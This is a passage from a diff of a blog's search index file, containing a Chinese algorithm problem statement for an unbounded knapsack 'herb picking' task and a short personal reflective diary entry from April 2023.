+<h2 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h2><p>LiYuxiang 是个天资聪颖的孩子，他的梦想是成为世界上最伟大的医师。为此，他想拜附近最有威望的医师为师。医师为了判断他的资质，给他出了一个难题。医师把他带到一个到处都是草药的山洞里对他说：“孩子，这个山洞里有一些不同种类的草药，采每一种都需要一些时间，每一种也有它自身的价值。我会给你一段时间，在这段时间里，你可以采到一些草药。如果你是一个聪明的孩子，你应该可以让采到的草药的总价值最大。”</p>
+<p>如果你是 LiYuxiang，你能完成这个任务吗？</p>
+<p>此题和原题的不同点：</p>
+<p>$1$. 每种草药可以无限制地疯狂采摘。</p>
+<p>$2$. 药的种类眼花缭乱，采药时间好长好长啊！师傅等得菊花都谢了！</p>
+<h2 id="输入格式"><a href="#输入格式" class="headerlink" title="输入格式"></a>输入格式</h2><p>输入第一行有两个整数，分别代表总共能够用来采药的时间 $t$ 和代表山洞里的草药的数目 $m$。</p>
+<p>第 $2$ 到第 $(m + 1)$ 行，每行两个整数，第 $(i + 1)$ 行的整数 $a_i, b_i$ 分别表示采摘第 $i$ 种草药的时间和该草药的价值。</p>
+<h2 id="输出格式"><a href="#输出格式" class="headerlink" title="输出格式"></a>输出格式</h2><p>输出一行，这一行只包含一个整数，表示在规定的时间内，可以采到的草药的最大总价值。</p>
+<h2 id="样例-1"><a href="#样例-1" class="headerlink" title="样例 #1"></a>样例 #1</h2><h3 id="样例输入-1"><a href="#样例输入-1" class="headerlink" title="样例输入 #1"></a>样例输入 #1</h3><pre><code>70 3
+71 100
+69 1
+1 2
+</code></pre>
+<h3 id="样例输出-1"><a href="#样例输出-1" class="headerlink" title="样例输出 #1"></a>样例输出 #1</h3><pre><code>140
+</code></pre>
+<h2 id="提示"><a href="#提示" class="headerlink" title="提示"></a>提示</h2><h4 id="数据规模与约定"><a href="#数据规模与约定" class="headerlink" title="数据规模与约定"></a>数据规模与约定</h4><ul>
+<li>对于 $30%$ 的数据，保证 $m \le 10^3$ 。</li>
+<li>对于 $100%$ 的数据，保证 $1 \leq m \le 10^4$，$1 \leq t \leq 10^7$，且 $1 \leq m \times t \leq 10^7$，$1 \leq a_i, b_i \leq 10^4$。</li>
+</ul>
+<blockquote>
+<p>显然这个一个完全背包问题，对于完全背包问题的求解</p>
+</blockquote>
+]]></content>
+      <categories>
+        <category>算法</category>
+      </categories>
+      <tags>
+        <tag>动态规划</tag>
+        <tag>背包问题</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>应是天仙狂醉，乱把白云揉碎</title>
+    <url>/2023/04/18/%E5%BA%94%E6%98%AF%E5%A4%A9%E4%BB%99%E7%8B%82%E9%86%89%EF%BC%8C%E4%B9%B1%E6%8A%8A%E7%99%BD%E4%BA%91%E6%8F%89%E7%A2%8E/</url>
+    <content><![CDATA[<blockquote>
+<p>人是一根会思想的苇草</p>
+</blockquote>
+<p>这是一场非正式会谈，我与我的。</p>
+<p>我这一生最讨厌三种人，欺骗、不守约定、孰若无睹，事实上，无比憎恨。</p>
+<p>想必这和我的经历有关，但我也不愿提及，就此散去吧。</p>
+<p>忽然想来，18年来，没有一日不彷徨无知，我还未曾真正瞧过自己一眼，或许瞧过，未曾入眼。</p>
+<p>讨厌的事情总是莫名其妙，就好像我不喜欢下雨，却又喜欢淋雨，或许这就是我的归宿，我也无力改变，但是我又的的确确要做些什么。倘若什么都不做，任由雨打满身，那也有点可悲，我不惧雨淋，不惧湿身，但也要在淋雨时迎风跑起，让那雨更猛烈的捶打着我，下次再遇见这雨，可就亲切又自然了。</p>
+<p>雨淋多了，总是会生病的。可能我也病了，我也不例外，这世界上病的人当然很多，病的千奇百怪，却没有人与我相似。在迷茫中寻求希望，未免是有点天真无知的。我不妄想希望的存在，我想成为自己的希望，千真万确。虽然听起来，更像是妄想。</p>
+<p>我又何尝不知我是在画地为牢，那又如何，属于我的一隅之地，也容许我孤芳自赏，这里不因是我的囚笼，这是我的天堂，我孤身起舞，不辜负我孤傲的人生。</p>
+<blockquote>
+<p>2023 4 18 萃文楼<br> 无法顶格空格的事，姑且下次再谈吧</p>
+</blockquote>
+]]></content>
+      <categories>
+        <category>日常</category>
+      </categories>
+      <tags>
+        <tag>不是好事</tag>
       </tags>
   </entry>
 </search>
